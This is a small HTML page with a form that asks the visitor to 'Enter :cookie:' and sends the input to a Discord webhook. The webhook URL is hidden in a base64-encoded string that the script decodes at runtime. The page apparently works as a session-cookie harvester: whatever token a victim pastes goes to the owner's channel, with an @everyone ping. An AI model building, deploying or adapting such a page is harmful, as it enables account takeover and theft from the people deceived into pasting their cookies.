<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Send to Discord</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      background-color: #111827;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    h1 {
      font-size: 2rem;
      margin-bottom: 20px;
    }
    input[type="text"] {
      padding: 12px 20px;
      border-radius: 8px;
      border: none;
      outline: none;
      width: 300px;
      max-width: 90%;
      font-size: 1rem;
      background-color: #1f2937;
      color: white;
    }
    button {
      margin-top: 15px;
      padding: 10px 25px;
      border: none;
      border-radius: 6px;
      background-color: #3b82f6;
      color: white;
      font-size: 1rem;
      cursor: pointer;
    }
    button:hover {
      background-color: #2563eb;
    }
  </style>
</head>
<body>

  <h1>Enter :cookie:</h1>
  <form id="textForm">
    <input type="text" id="textInput" placeholder=":cookie:" required />
    <br />
    <button type="submit">Send</button>
  </form>

  <script>
    const encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzNDg3MTI5NTIxMjUyMzU4MC95aUppTFVXeG5aNVRzUEE2RlNXNEkySF9IZzVkMWp1VklsejhzVlY5MHEySTE0NU9ocUJQWnZMb0xZMU9zcGxqZkt5Zw==";

    const webhookUrl = atob(encodedWebhook);

    document.getElementById("textForm").addEventListener("submit", function (e) {
      e.preventDefault();
      const input = document.getElementById("textInput").value;

      const payload = {
        content: `@everyone @here\nMessage: **${input}**`
      };

      fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      })
      .then(res => {
        if (res.ok) {
          alert("Sent to Discord successfully!");
        } else {
          alert("Failed to send to Discord.");
        }
      });
    });
  </script>
</body>
</html>
